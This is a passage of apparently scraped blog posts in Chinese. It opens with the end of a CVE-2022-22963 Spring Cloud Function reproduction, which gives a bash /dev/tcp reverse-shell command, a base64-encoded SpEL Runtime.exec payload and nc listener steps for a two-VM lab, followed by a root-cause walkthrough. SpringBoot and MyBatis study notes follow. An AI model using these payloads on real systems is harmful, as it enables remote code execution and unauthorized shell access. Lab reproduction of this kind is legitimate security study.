这里我们需要将我们需要进行cve执行的ip都存放到一个文件夹(比如ip.txt)里面 执行的时候调用python3 exp.py ip.txt即可 反弹shell 我们可以通过反弹shell拿到稳定的shell 本地实现 这里是通过本机的两个端口实现。\n命令准备\n1 2 3 4 反弹shell命令： bash -i \u0026gt;\u0026amp; /dev/tcp/127.0.0.1/8899 0\u0026gt;\u0026amp;1 base64加密： bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODg5OSAwPiYx}|{base64,-d}|{bash,-i} 修改数据包后，发送数据包：\n同时在本机用nc -l 8899 监听8899发送来的信息。\n数据包发送完毕之后 由此拿到稳定的shell https://blog.csdn.net/xhwfa/article/details/124307153 两个虚拟机实现 靶机：ubuntu 18 : IP:192.168.195.133\n攻击机:kali linux : IP:192.168.195.131\n在攻击机开启nc -lvvp 8899对8899端口进行监听\n同时攻击机对exp脚本进行运行\n拿到shell\nexp脚本：\n即为将上面的通用脚本里面的payload改写一下即可\n1 payload = \u0026#39;T(java.lang.Runtime).getRuntime().exec(\u0026#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjczLjEzMS84ODk5IDA+JjE=}|{base64,-d}|{bash,-i}\u0026#34;)\u0026#39; 原理分析 根据漏洞原理及官方测试用例可以知晓漏洞触发点在http header中spring.cloud.function.routing-expression字段。\n在命令执行出下断点，看下程序执行流程。\nSpringCloud Function之所以能自动将函数建立http端点，是因为在包mvc.FunctionController中使用/** 监听了get/post类型的所有端点。\n1、当一个请求进入时，程序首先基于Springboot的自动配置，调用处理器，随后将以“WebRequestConstants.handler”为key，function为值添加到request数组里面。\n2、根据上述分析，我们发现对数据包封装好之后，我们都需要调用函数processRequest，我们直接在processRequest打断点\n可以发现wrapper封装的即为我们的HTTP头 同时查看参数function,发现其functionDefinition为functionRouter 如果设置为functionRouter则默认路由绑定的具体函数交由用户进行控制，在 Spring Cloud Function Web里面，可以通过设置http头的方式来控制，使用spring.cloud.function.definition 和spring.cloud.function.routing-expression 都可以，区别是后者允许使用Spring表达式语言（SpEL）。 3、通过判断后执行function的apply方法\n然后在apply中执行doaply方法\n4、判断是不是functionRouter方法，判断当前的类型，是RouteFunction或者Composed直接跳转到else，执行自己的apply方法，这里是functionRouter，我们直接就执行funtionRouter的apply方法\n发现在functionRouter的apply方法中实际上调用的是route方法 5、分析route方法\n因为function为null,直接进入if-else\n可以看到程序检查headers参数中是否有“spring.cloud.function.definition”或者“spring.cloud.function.routing-expression“字段，并进行相应的处理。如果是spring.cloud.function.routing-expression ，则调用 functionFromExpression()方法处理。\n6、跟进到functionFromExpression方法中，参数中routingExpression，可以看一下该参数为T(java.lang.Runtime).getRuntime().exec(\u0026quot;whoami\u0026quot;)，也就是header中传入的。传入后由spelParser.parseExpression（）处理。\n7、漏洞也就是在这里SpEL表达式解析，进行触发。\n","permalink":"http://www.reus09.top/posts/tech/cve-2022-22963/","summary":"漏洞介绍 Spring Cloud Function 是基于 Spring Boot 的函数计算框架。该项目致力于促进函数为主的开发单元，它抽象出所有传输细节和基础架构，并提供一个通用的模型，用于在各种","title":"CVE-2022-22963漏洞复现"},{"content":" 因为之前接触了一点ssm，所以这里简单的学习了springboot的一些简单用法，具体的源码分析以后有时间的话慢慢分析 这里简单谈一下springboot的简单了解，springboot实际上是把ssm、web服务器比如tomcat,jetty、mysql或者nosql各个框架整合到一起的产物，使用springboot实际上简化了各个框架的组合使用。 springboot中加载支持的配置的依赖一般以springboot-starter-xxx 非官方支持的第三方依赖命名：xxx-springboot-starter-xxx SpringBoot默认会在底层配好所有的组件。但是如果用户自己配置了以用户的优先 学习可以通过springboot提供的官方文档 这里给出2.5.13版本的官方文档链接 https://docs.spring.io/spring-boot/docs/2.5.13/reference/html/ 1 配置使用 application.properties和application.yaml 2 注解使用 因为springboot集成了springmvc和spring，也组合了其许多的注解 @SpringBootApplication 1 2 3 4 5 @SpringBootApplication 等同于 @SpringBootConfiguration @EnableAutoConfiguration @ComponentScan(\u0026#34;com.reus.boot\u0026#34;) @SpringBootConfiguration @Configuration。代表当前是一个配置类 @EnableAutoConfiguration 1 2 3 @AutoConfigurationPackage @Import(AutoConfigurationImportSelector.class) public @interface EnableAutoConfiguration {} @EnableAutoConfiguration集成了两个注解\n@AutoConfigurationPackage\n自动配置包,指定了默认的包规则\n1 2 3 4 5 @Import(AutoConfigurationPackages.Registrar.class) //给容器中导入一个组件 public @interface AutoConfigurationPackage {} //利用Registrar给容器中导入一系列组件 //将指定的一个包下的所有组件导入进来？MainApplication 所在包下。 实际上将我们自己编写的在默认包中的组件加入到容器中\n@Import(AutoConfigurationImportSelector.class)\n1 2 3 4 5 6 1、利用getAutoConfigurationEntry(annotationMetadata);给容器中批量导入一些组件 2、调用List\u0026lt;String\u0026gt; configurations = getCandidateConfigurations(annotationMetadata, attributes)获取到所有需要导入到容器中的配置类 3、利用工厂加载 Map\u0026lt;String, List\u0026lt;String\u0026gt;\u0026gt; loadSpringFactories(@Nullable ClassLoader classLoader)；得到所有的组件 4、从META-INF/spring.factories位置来加载一个文件。 默认扫描我们当前系统里面所有META-INF/spring.factories位置的文件 spring-boot-autoconfigure-2.3.4.RELEASE.jar包里面也有META-INF/spring.factories 这里是加载springboot给我们提供的该项目需要绑定的默认组件。 @ComponentScan(\u0026quot;com.reus.boot\u0026quot;) 指定扫描哪些，Spring注解；指定扫描那些包 @Configuration 告诉容器这是一个配置类\n基本使用 Full模式与Lite模式 示例 最佳实战 配置 类组件之间无依赖关系用Lite模式加速容器启动过程，减少判断 配置类组件之间有依赖关系，方法会被调用得到之前单实例组件，用Full模式 配置类里面使用@Bean标注在方法上给容器注册组件，默认也是单实例的 配置类本身也是组件 proxyBeanMethods：代理bean的方法 Full(proxyBeanMethods = true)、【保证每个@Bean方法被调用多少次返回的组件都是单实例的】 Lite(proxyBeanMethods = false)【每个@Bean方法被调用多少次返回的组件都是新创建的】 组件依赖必须使用Full模式默认。其他默认是否Lite模式 @Conditional 条件装配：满足Conditional指定的条件，则进行组件注入 作用在组件上，如果满足注解的contional条件就生效，否则就不生效 @ConfigurationProperties 法一 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 /** * 只有在容器中的组件，才会拥有SpringBoot提供的强大功能 */ @Component @ConfigurationProperties(prefix = \u0026#34;person\u0026#34;) public class Person { private String userName; private Boolean boss; private Date birth; private Integer age; private Pet pet; private String[] interests; private List\u0026lt;String\u0026gt; animal; private Map\u0026lt;String, Object\u0026gt; score; private Set\u0026lt;Double\u0026gt; salarys; private Map\u0026lt;String, List\u0026lt;Pet\u0026gt;\u0026gt; allPets; } 法二\n不标注@Component即不需要讲Person类加载到组件中\n这样在需要绑定的时候，标注注解\n1 2 3 4 5 @EnableConfigurationProperties(Person.class) //1、开启Person配置绑定功能 //2、把这个Person这个组件自动注册到容器中 public class MyConfig { } 这个组件的赋值是在配置文件application.properties或application.xml里面找到\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 person: birth: 2001/11/1 age: 18 # interests: [篮球,足球] interests: - 篮球 - 足球 animal: [阿毛，阿狗] score: {english:80,shuxue:90} salarys: - 9999.98 - 9999.91 pet: name: cat weight: 99.2 allPets: sick: - {name: 阿狗,weight: 99.99} - name: 阿猫 weight: 88 - name: 阿丢 weight: 22 health: - {name: 阿花,weight:199.22} - {name: 阿水,weight:122.22} user-name: zhangsan boss: true @RestController 1 2 3 4 5 6 7 8 9 10 11 @Target({ElementType.TYPE}) @Retention(RetentionPolicy.RUNTIME) @Documented @Controller @ResponseBody public @interface RestController { @AliasFor( annotation = Controller.class ) String value() default \u0026#34;\u0026#34;; } 实际集成了Controller和ResponseBody 标注了该类是一个组件，并且表明的结果为字符串直接返回到浏览器。 普通参数注解 @PathVariable、@RequestHeader、@ModelAttribute、@RequestParam、@MatrixVariable、@CookieValue、@RequestBody\n这些注解在springmvc中已经了解过，就不在赘述\n1 2 3 4 5 6 7 8 9 10 11 12 // car/2/owner/zhangsan @GetMapping(\u0026#34;/car/{id}/owner/{username}\u0026#34;) public Map\u0026lt;String,Object\u0026gt; getCar(@PathVariable(\u0026#34;id\u0026#34;) Integer id, @PathVariable(\u0026#34;username\u0026#34;) String name, @PathVariable Map\u0026lt;String,String\u0026gt; pv, @RequestHeader(\u0026#34;User-Agent\u0026#34;) String userAgent, @RequestHeader Map\u0026lt;String,String\u0026gt; header, @RequestParam(\u0026#34;age\u0026#34;) Integer age, @RequestParam(\u0026#34;inters\u0026#34;) List\u0026lt;String\u0026gt; inters, @RequestParam Map\u0026lt;String,String\u0026gt; params, @CookieValue(\u0026#34;_ga\u0026#34;) String _ga, @CookieValue(\u0026#34;_ga\u0026#34;) Cookie cookie){ 3 资源放置 静态资源目录\n只要静态资源放在类路径下： called /static(or/publicor/resourcesor/META-INF/resources`\n访问 ： 当前项目根路径/ + 静态资源名\n原理： 静态映射/**。\n请求进来，先去找Controller看能不能处理。不能处理的所有请求又都交给静态资源处理器。静态资源也找不到则响应404页面 配置文件修改\n1 2 3 4 5 6 spring: mvc: static-path-pattern: /res/** # 表示web访问静态资源的路径 resources: static-locations: [classpath:/haha/] # 表示静态资源服务器端访问的路径 自定义 Favicon\n这个只需要将图片命名为favicon.ico ，将其放置在静态资源路径下即可 4 异常处理 默认规则 默认情况下，Spring Boot提供/error处理所有错误的映射 对于机器客户端，它将生成JSON响应，其中包含错误，HTTP状态和异常消息的详细信息。对于浏览器客户端，响应一个“ whitelabel”错误视图，以HTML格式呈现相同的数据 5 常见组件引入 引入json 导入json依赖\n1 2 3 4 5 6 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-json\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.3.4.RELEASE\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;compile\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; 导入这个包，返回的值如果为自定义的pojo类型，则容器可以将其处理为json之后返回给客户端\n具体实现流程以后有时间再具体分析 整合Mybatis 导入依赖\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;8.0.25\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.baomidou\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis-plus-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; mybatis-plus实际上已经整合了mybatis依赖\n配置文件进行配置\n配置数据库\n1 2 3 4 5 6 7 8 9 spring: datasource: url: jdbc:mysql://localhost:3306/mybatis?characterEncoding=utf8\u0026amp;useSSL=false\u0026amp;serverTimezone=UTC\u0026amp;rewriteBatchedStatements=true username: root password: root driver-class-name: com.mysql.cj.jdbc.Driver jdbc: template: query-timeout: 1000 SqlSessionFactory 自动配置好。底层是容器中默认的数据源\nmapperLocations 自动配置好的。\n有默认值。 classpath*:/mapper/**/*.xml；任意包的类路径下的所有mapper文件夹下任意路径下的所有xml都是sql映射文件。 建议以后sql映射文件，放在 mapper下 单元测试 依赖导入\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-test\u0026lt;/artifactId\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; 使用配置需要标注注解@SpringBootTest\n1 2 3 4 5 6 7 @SpringBootTest class WebAdminApplicationTests { @Test void contextLoads() { } } 常用注解\n**@Test :**表示方法是测试方法。但是与JUnit4的@Test不同，他的职责非常单一不能声明任何属性，拓展的测试将会由Jupiter提供额外测试 **@ParameterizedTest :**表示方法是参数化测试，下方会有详细介绍 **@RepeatedTest :**表示方法可重复执行，下方会有详细介绍 **@DisplayName :**为测试类或者测试方法设置展示名称 **@BeforeEach :**表示在每个单元测试之前执行 **@AfterEach :**表示在每个单元测试之后执行 **@BeforeAll :**表示在所有单元测试之前执行 **@AfterAll :**表示在所有单元测试之后执行 **@Tag :**表示单元测试类别，类似于JUnit4中的@Categories **@Disabled :**表示测试类或测试方法不执行，类似于JUnit4中的@Ignore **@Timeout :**表示测试方法运行如果超过了指定时间将会返回错误 **@ExtendWith :**为测试类或测试方法提供扩展类引用 简单断言\n用来对单个值进行简单的验证。如：\n方法 说明 assertEquals 判断两个对象或两个原始类型是否相等 assertNotEquals 判断两个对象或两个原始类型是否不相等 assertSame 判断两个对象引用是否指向同一个对象 assertNotSame 判断两个对象引用是否指向不同的对象 assertTrue 判断给定的布尔值是否为 true assertFalse 判断给定的布尔值是否为 false assertNull 判断给定的对象引用是否为 null assertNotNull 判断给定的对象引用是否不为 null 6 自定义 标注一个类为configuration 然后在里面重写WebMvcConfigure组件 需要重写哪个功能直接实现重写哪个组件，没有被重写的组件继续使用springboot默认提供的组件 如果加入注解@EnableWebMvc 那么所有的组件都需要重写，不重写等同于没有作用 场景starter - xxxxAutoConfiguration - 导入xxx组件 - 绑定xxxProperties \u0026ndash; 绑定配置文件项 自定义 MessageConverter 实现多协议数据兼容。json、xml、x-reus\n0、**@ResponseBody 响应数据出去 调用 RequestResponseBodyMethodProcessor 处理 1、Processor 处理方法返回值。通过 MessageConverter 处理 2、所有 MessageConverter 合起来可以支持各种媒体类型数据的操作（读、写） 3、内容协商找到最终的 messageConverter； 首先需要实现自定义的messageConverter，继承HttpMessageConver即可\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 public class ReusMessageConverter implements HttpMessageConverter\u0026lt;Person\u0026gt; { @Override public boolean canRead(Class\u0026lt;?\u0026gt; clazz, MediaType mediaType) { return false; } @Override public boolean canWrite(Class\u0026lt;?\u0026gt; clazz, MediaType mediaType) { return clazz.isAssignableFrom(Person.class); } @Override public List\u0026lt;MediaType\u0026gt; getSupportedMediaTypes() { return MediaType.parseMediaTypes(\u0026#34;application/x-reus\u0026#34;); } @Override public Person read(Class\u0026lt;? extends Person\u0026gt; clazz, HttpInputMessage inputMessage) throws IOException, HttpMessageNotReadableException { return null; } @Override public void write(Person person, MediaType contentType, HttpOutputMessage outputMessage) throws IOException, HttpMessageNotWritableException { // 自定义数据 String data = person.getUserName()+\u0026#34;;\u0026#34;+person.getAge()+\u0026#34;;\u0026#34;+person.getBirth(); // 写出去 OutputStream body = outputMessage.getBody(); body.write(data.getBytes()); } } 然后在我们的WebMvcConfigure中添加我们的组件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 @Bean public WebMvcConfigurer webMvcConfigurer(){ return new WebMvcConfigurer() { /** * 自定义内容协商策略 * @param configurer */ @Override public void configureContentNegotiation(ContentNegotiationConfigurer configurer) { //Map\u0026lt;String, MediaType\u0026gt; mediaTypes Map\u0026lt;String, MediaType\u0026gt; mediaTypes = new HashMap\u0026lt;\u0026gt;(); mediaTypes.put(\u0026#34;json\u0026#34;,MediaType.APPLICATION_JSON); mediaTypes.put(\u0026#34;xml\u0026#34;,MediaType.APPLICATION_XML); mediaTypes.put(\u0026#34;gg\u0026#34;,MediaType.parseMediaType(\u0026#34;application/x-reus\u0026#34;)); //指定支持解析哪些参数对应的哪些媒体类型 ParameterContentNegotiationStrategy parameterStrategy = new ParameterContentNegotiationStrategy(mediaTypes); // parameterStrategy.setParameterName(\u0026#34;ff\u0026#34;); HeaderContentNegotiationStrategy headeStrategy = new HeaderContentNegotiationStrategy(); configurer.strategies(Arrays.asList(parameterStrategy,headeStrategy)); } // 添加我们自定义的MessageConverter @Override public void extendMessageConverters(List\u0026lt;HttpMessageConverter\u0026lt;?\u0026gt;\u0026gt; converters) { converters.add(new ReusMessageConverter()); } } } 自定义拦截器 以这个检测登录的拦截器为例\n先基于HandlerInterceptor接口编写自己的登录拦截器\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 public class LoginInterceptor implements HandlerInterceptor { /** * 目标方法执行之前 * @param request * @param response * @param handler * @return * @throws Exception */ @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { String requestURI = request.getRequestURI(); log.info(\u0026#34;preHandle拦截的请求路径是{}\u0026#34;,requestURI); //登录检查逻辑 HttpSession session = request.getSession(); Object loginUser = session.getAttribute(\u0026#34;loginUser\u0026#34;); if(loginUser != null){ //放行 return true; } //拦截住。未登录。跳转到登录页 request.setAttribute(\u0026#34;msg\u0026#34;,\u0026#34;请先登录\u0026#34;); // re.sendRedirect(\u0026#34;/\u0026#34;); request.getRequestDispatcher(\u0026#34;/\u0026#34;).forward(request,response); return false; } /** * 目标方法执行完成以后 * @param request * @param response * @param handler * @param modelAndView * @throws Exception */ @Override public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception { log.info(\u0026#34;postHandle执行{}\u0026#34;,modelAndView); } /** * 页面渲染以后 * @param request * @param response * @param handler * @param ex * @throws Exception */ @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception { log.info(\u0026#34;afterCompletion执行异常{}\u0026#34;,ex); } } 然后继承WebMvcConfigure\n1 2 3 4 5 6 @Override public void addInterceptors(InterceptorRegistry registry) { registry.addInterceptor(new LoginInterceptor()) .addPathPatterns(\u0026#34;/**\u0026#34;) //所有请求都被拦截包括静态资源 .excludePathPatterns(\u0026#34;/\u0026#34;,\u0026#34;/login\u0026#34;,\u0026#34;/css/**\u0026#34;,\u0026#34;/fonts/**\u0026#34;,\u0026#34;/images/**\u0026#34;,\u0026#34;/js/**\u0026#34;); } 7 开发技巧 Lombok 加入依赖\n1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.projectlombok\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;lombok\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 该依赖包的作用是放到创建的对象中，减少了代码的复用。\n@NoArgsConstructor : 无参数构造 @AllArgsConstructor ： 全参数构造 @Data ： 提供get和set方法 @ToString ： 提供toString @EqualsAndHashCode Spring Initailizr（项目初始化向导） 这个是IEDA提供的 在新建module的时候，选择Spring Initializr 选择我们需要加入的组件即可 spring-boot-configuration-processor 这个依赖包加入后，可以支持对application.yaml配置文件的提示功能，便于编写。 Mybatis plus 这个简化了mapper接口和xml的创建和简单增删改查的实现 只需要选中对应的数据库 点击mybatisx-generator,选择相关配置即可。 对应的简单增删改查可以继承BaseMapper\u0026lt;class\u0026gt;类中的方法来实现 ","permalink":"http://www.reus09.top/posts/tech/springboot/","summary":"因为之前接触了一点ssm，所以这里简单的学习了springboot的一些简单用法，具体的源码分析以后有时间的话慢慢分析 这里简单谈一下spri","title":"SpringBoot"},{"content":"MyBatis 这里整理了MyBatis的常见用法 Mybatis 主要对数据库的操作提供了组件 1 环境搭建 导入依赖\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;!-- Mybatis核心 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.7\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- MySQL驱动 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;8.0.27\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 创建MyBatis的核心配置文件\nmybatis-config.xml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt; \u0026lt;!DOCTYPE configuration PUBLIC \u0026#34;-//mybatis.org//DTD Config 3.0//EN\u0026#34; \u0026#34;http://mybatis.org/dtd/mybatis-3-config.dtd\u0026#34;\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;!-- 核心配置文件中的标签必须按照固定的顺序(有的标签可以不写，但顺序一定不能乱)： properties、settings、typeAliases、 typeHandlers、objectFactory、 objectWrapperFactory、reflectorFactory、 plugins、environments、databaseIdProvider、 mappers --\u0026gt; \u0026lt;!-- 引入 jdbc的配置文件 --\u0026gt; \u0026lt;properties resource=\u0026#34;jdbc.properties\u0026#34;/\u0026gt; \u0026lt;!-- 设置Mybatis 的全局配置--\u0026gt; \u0026lt;settings\u0026gt; \u0026lt;!--将表中字段的下划线自动转换为驼峰--\u0026gt; \u0026lt;setting name=\u0026#34;mapUnderscoreToCamelCase\u0026#34; value=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;!--开启延迟加载--\u0026gt; \u0026lt;setting name=\u0026#34;lazyLoadingEnabled\u0026#34; value=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;/settings\u0026gt; \u0026lt;!-- 设置类型别名--\u0026gt; \u0026lt;typeAliases\u0026gt; \u0026lt;!--typeAlias 设置类型别名 type alias : 设置某个类型的别名，不区分大小写，如果没有设置，则存在一个固定的类名 --\u0026gt; \u0026lt;!-- \u0026lt;typeAlias type=\u0026#34;com.reus.mybatis.pojo.User\u0026#34; alias = \u0026#34;User\u0026#34;\u0026gt;\u0026lt;/typeAlias\u0026gt;--\u0026gt; \u0026lt;!-- 以包为单位 ，将包下的所有数据设置为默认的类型别名，即类名不区分带大小写 --\u0026gt; \u0026lt;package name=\u0026#34;com.reus.mybatis.pojo\u0026#34;/\u0026gt; \u0026lt;/typeAliases\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;!--设置分页插件--\u0026gt; \u0026lt;plugin interceptor=\u0026#34;com.github.pagehelper.PageInterceptor\u0026#34;\u0026gt;\u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;!-- environments:配置多个 数据库的环境 属性： default: 默认使用的环境的Id --\u0026gt; \u0026lt;environments default=\u0026#34;development\u0026#34;\u0026gt; \u0026lt;!-- 配置具体的环境 属性: id, 唯一标识 asd --\u0026gt; \u0026lt;environment id=\u0026#34;development\u0026#34;\u0026gt; \u0026lt;!-- transactionManager: 设置事务管理方式 JDBC 当前环境执行sql时，使用JDBC原生的事务管理方式，事务的提交和回滚需要手动处理 MANAGED ： 被Spring管理 --\u0026gt; \u0026lt;transactionManager type=\u0026#34;JDBC\u0026#34;/\u0026gt; \u0026lt;!--制定 数据源 Type: 数据类型 POOLED 数据库使用缓存数据库连接 UNPOOLED 不使用数据库连接池 JNDI 使用上下文中的数据源 --\u0026gt; \u0026lt;dataSource type=\u0026#34;POOLED\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;driver\u0026#34; value=\u0026#34;${jdbc.driver}\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;url\u0026#34; value=\u0026#34;${jdbc.url}\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;username\u0026#34; value=\u0026#34;${jdbc.username}\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;password\u0026#34; value=\u0026#34;${jdbc.password}\u0026#34;/\u0026gt; \u0026lt;/dataSource\u0026gt; \u0026lt;/environment\u0026gt; \u0026lt;/environments\u0026gt; \u0026lt;!--引入映射文件--\u0026gt; \u0026lt;mappers\u0026gt; \u0026lt;!-- \u0026lt;mapper resource=\u0026#34;mappers/UserMapper.xml\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!-- 以包为单位引入映射文件 要求 1、mapper接口所在的包要和映射文件所在的包一致 2、mapper接口要和映射文件的名字一致 --\u0026gt; \u0026lt;package name=\u0026#34;com.reus.mybatis.mapper\u0026#34;/\u0026gt; \u0026lt;/mappers\u0026gt; \u0026lt;/configuration\u0026gt; 2 具体配置及调用 创建mapper接口\nMyBatis中的mapper接口相当于以前的dao。但是区别在于，mapper仅仅是接口，我们不需要提供实现类\n1 2 3 4 5 6 7 8 package com.reus.mybatis.mapper; public interface UserMapper { /** * 添加用户信息 */ int insertUser(); } 创建对应的Mybatis映射文件\n相关概念：ORM（Object Relationship Mapping）对象关系映射。 对象：Java的实体类对象 关系：关系型数据库 映射：二者之间的对应关系 Java概念 数据库概念 类 表 属性 字段/列 对象 记录/行 映射文件的命名规则 表所对应的实体类的类名+Mapper.xml 例如：表t_user，映射的实体类为User，所对应的映射文件为UserMapper.xml 因此一个映射文件对应一个实体类，对应一张表的操作 MyBatis映射文件用于编写SQL，访问以及操作表中的数据 MyBatis映射文件存放的位置是src/main/resources/mappers目录下 MyBatis中可以面向接口操作数据，要保证两个一致 mapper接口的全类名和映射文件的命名空间（namespace）保持一致 mapper接口中方法的方法名和映射文件中编写SQL的标签的id属性保持一致 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt; \u0026lt;!DOCTYPE mapper PUBLIC \u0026#34;-//mybatis.org//DTD Mapper 3.0//EN\u0026#34; \u0026#34;http://mybatis.org/dtd/mybatis-3-mapper.dtd\u0026#34;\u0026gt; \u0026lt;mapper namespace=\u0026#34;com.reus.mybatis.mapper.UserMapper\u0026#34;\u0026gt; \u0026lt;!--int insertUser();--\u0026gt; \u0026lt;insert id=\u0026#34;insertUser\u0026#34;\u0026gt; insert into t_user values(null,\u0026#39;张三\u0026#39;,\u0026#39;123\u0026#39;,23,\u0026#39;女\u0026#39;,\u0026#39;123@qq.com\u0026#39;) \u0026lt;/insert\u0026gt; \u0026lt;!--updateUser--\u0026gt; \u0026lt;update id=\u0026#34;updateUser\u0026#34;\u0026gt; update t_user set username = \u0026#39;李四\u0026#39; where id = 4 \u0026lt;/update\u0026gt; \u0026lt;!--void deleteUser();--\u0026gt; \u0026lt;delete id=\u0026#34;deleteUser\u0026#34;\u0026gt; delete from t_user where id = 4 \u0026lt;/delete\u0026gt; \u0026lt;!--User getUserById(); 必须设置对应的标签 resultType 和 resultMap resultType : 设置默认的映射关系 resultMap: 设置自定义的映射关系 --\u0026gt; \u0026lt;select id=\u0026#34;getUserById\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user where id = 3 \u0026lt;/select\u0026gt; \u0026lt;!--List\u0026lt;User\u0026gt; getAllUser(); --\u0026gt; \u0026lt;select id=\u0026#34;getAllUser\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user; \u0026lt;/select\u0026gt; \u0026lt;/mapper\u0026gt; 获取配置中的信息\n运用SqlsessionFactory 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 public class UserMapperTest { @Test public void testInsertUser() throws IOException { //读取MyBatis的核心配置文件 InputStream is = Resources.getResourceAsStream(\u0026#34;mybatis-config.xml\u0026#34;); //获取SqlSessionFactoryBuilder对象 SqlSessionFactoryBuilder sqlSessionFactoryBuilder = new SqlSessionFactoryBuilder(); //通过核心配置文件所对应的字节输入流创建工厂类SqlSessionFactory，生产SqlSession对象 SqlSessionFactory sqlSessionFactory = sqlSessionFactoryBuilder.build(is); //获取sqlSession，此时通过SqlSession对象所操作的sql都必须手动提交或回滚事务 //SqlSession sqlSession = sqlSessionFactory.openSession(); //创建SqlSession对象，此时通过SqlSession对象所操作的sql都会自动提交 SqlSession sqlSession = sqlSessionFactory.openSession(true); //通过代理模式创建UserMapper接口的代理实现类对象 UserMapper userMapper = sqlSession.getMapper(UserMapper.class); //调用UserMapper接口中的方法，就可以根据UserMapper的全类名匹配元素文件，通过调用的方法名匹配映射文件中的SQL标签，并执行标签中的SQL语句 int result = userMapper.insertUser(); //提交事务 //sqlSession.commit(); System.out.println(\u0026#34;result:\u0026#34; + result); } } 3 获取参数 MyBatis获取参数值的两种方式：${}和#{} ${}的本质就是字符串拼接，#{}的本质就是占位符赋值 ${}使用字符串拼接的方式拼接sql，若为字符串类型或日期类型的字段进行赋值时，需要手动加单引号；但是#{}使用占位符赋值的方式拼接sql，此时为字符串类型或日期类型的字段进行赋值时，可以自动添加单引号 3.1 单个字面量类型数据 单个字面量类型数据\n若mapper接口中的方法参数为单个的字面量类型，此时可以使用${}和#{}以任意的名称（最好见名识意）获取参数的值，注意${}需要手动加单引号 1 2 3 4 5 6 7 8 9 \u0026lt;!--User getUserByUsername(String username);--\u0026gt; \u0026lt;select id=\u0026#34;getUserByUsername\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user where username = #{username} \u0026lt;/select\u0026gt; \u0026lt;!--User getUserByUsername(String username);--\u0026gt; \u0026lt;select 